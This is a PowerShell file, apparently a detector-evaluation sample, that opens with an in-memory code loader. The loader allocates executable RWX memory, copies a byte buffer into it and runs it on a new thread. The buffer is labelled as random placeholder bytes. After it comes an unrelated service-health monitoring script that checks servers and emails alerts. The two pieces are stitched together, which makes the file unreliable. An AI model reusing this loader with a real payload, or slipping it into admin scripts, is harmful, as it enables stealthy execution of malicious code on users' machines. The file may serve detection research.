<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xba, 0x57, 0xfd, 0x4e, 0x88, 0xcc, 0x46, 0x80, 0x83, 0x91, 0x00, 0xb8, 0xda, 0x12, 0xb6, 0xad,
        0x4d, 0x77, 0x5f, 0x63, 0xb7, 0xee, 0x5c, 0x2b, 0xe7, 0x01, 0xa1, 0xd4, 0xa5, 0xd4, 0x29, 0x9a,
        0x36, 0xa6, 0x54, 0x45, 0xdb, 0x93, 0x9c, 0x1b, 0xf4, 0xe1, 0x09, 0x7f, 0x69, 0x66, 0xb9, 0xe9,
        0xe4, 0xc5, 0x4d, 0x62, 0x4a, 0xc3, 0xc0, 0x16, 0xce, 0x20, 0x27, 0x5a, 0xbb, 0x2e, 0xf3, 0x6e,
        0x2a, 0xff, 0x0d, 0x37, 0x7f, 0x70, 0x75, 0x2c, 0xc9, 0x69, 0xb9, 0x7d, 0x5c, 0xc1, 0xde, 0x6a,
        0xe3, 0x8d, 0xb9, 0x8d, 0x1a, 0x22, 0x22, 0x04, 0x06, 0xb6, 0x3c, 0x74, 0x75, 0xbe, 0x7d, 0xcf,
        0xbc, 0x4c, 0x28, 0x7a, 0x20, 0xe5, 0x1f, 0xe1, 0x95, 0x9b, 0xaf, 0xed, 0xef, 0x48, 0xcd, 0x31,
        0x89, 0x8e, 0xff, 0x88, 0xc4, 0x7d, 0xb5, 0xc4, 0xaa, 0xae, 0xa8, 0x0e, 0x6c, 0xac, 0xfd, 0x84,
        0x7a, 0x04, 0x3a, 0x7e, 0x92, 0xe0, 0xad, 0x6c, 0x5d, 0x6b, 0x5d, 0xac, 0x1e, 0x8c, 0xb9, 0x85,
        0x3d, 0x85, 0x52, 0x23, 0xe2, 0x3d, 0x7a, 0x4f, 0xa0, 0x3d, 0x40, 0x9b, 0x0f, 0x28, 0x88, 0x38,
        0x54, 0xf3, 0xe4, 0xc1, 0x15, 0xef, 0x42, 0x60, 0xc3, 0x74, 0x29, 0x07, 0x9e, 0xd6, 0x4d, 0xaa,
        0x63, 0x17, 0x4f, 0x94, 0x18, 0x70, 0x05, 0x2a, 0x6e, 0xab, 0x2f, 0x41, 0x70, 0x78, 0xbb, 0xf3,
        0xaa, 0xd1, 0xcd, 0xd4, 0x2e, 0xd9, 0xf1, 0x0f, 0x9e, 0x74, 0xc8, 0x9b, 0xf6, 0x31, 0xa4, 0x3d,
        0xa8, 0xbd, 0xda, 0xdd, 0x25, 0xc1, 0x09, 0xf4, 0x68, 0x60, 0xd2, 0x97, 0x0f, 0x92, 0x95, 0x95,
        0xa7, 0xf5, 0x52, 0x7c, 0x3f, 0x0b, 0xed, 0x39, 0xd4, 0xc0, 0xc6, 0xf4, 0x56, 0x99, 0xdb, 0x14,
        0x85, 0x4f, 0x6d, 0x1c, 0x1f, 0x32, 0x76, 0x4d, 0x33, 0x2d, 0x76, 0x3c, 0xdc, 0xa5, 0xd0, 0x70,
        0xb3, 0x26, 0x74, 0x0a, 0x1f, 0xd7, 0xd9, 0x57, 0xdb, 0x37, 0x0c, 0xf8, 0x4b, 0x29, 0xeb, 0x38,
        0x46, 0x8c, 0xff, 0x35, 0x3a, 0xfa, 0x7a, 0x42, 0xea, 0x8d, 0x83, 0x6e, 0xc5, 0xbb, 0x00, 0x4d,
        0x6b, 0xc1, 0xfb, 0xff, 0x28, 0x64, 0x9e, 0x0f, 0x5a, 0xf8, 0x09, 0x24, 0x09, 0x67, 0x9b, 0x3a,
        0x6c, 0x72, 0xaa, 0x7c, 0xb3, 0x12, 0x03, 0xc8, 0x4e, 0x3a, 0x56, 0xb5, 0xa3, 0x76, 0x24, 0x9e,
        0xc4, 0x19, 0x06, 0xe7, 0x67, 0x91, 0x0a, 0x86, 0x0d, 0x0d, 0x22, 0x65, 0x45, 0x39
    )

    $HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 4564)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
$Servers             = @('sql-prod-02', 'mgmt01', 'dc01', 'web-prod-03')
$Services            = @('Dhcp', 'MSSQLSERVER')
$Port                = 443
$TimeoutMilliseconds = 1000
$ReportPath          = 'C:\Reports\service-health-2024-07-10.csv'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$WarningPreference = 'Continue'
$hostName = $env:COMPUTERNAME

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}
$results | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$down | Format-Table -AutoSize
Write-Host ("{0} checks, {1} not running" -f @($results).Count, $down.Count) -ForegroundColor Cyan

$MailTo = 'monitoring@internal.corp'
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From "monitoring@internal.corp" -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.internal.corp' -Port 25 -UseSsl
}
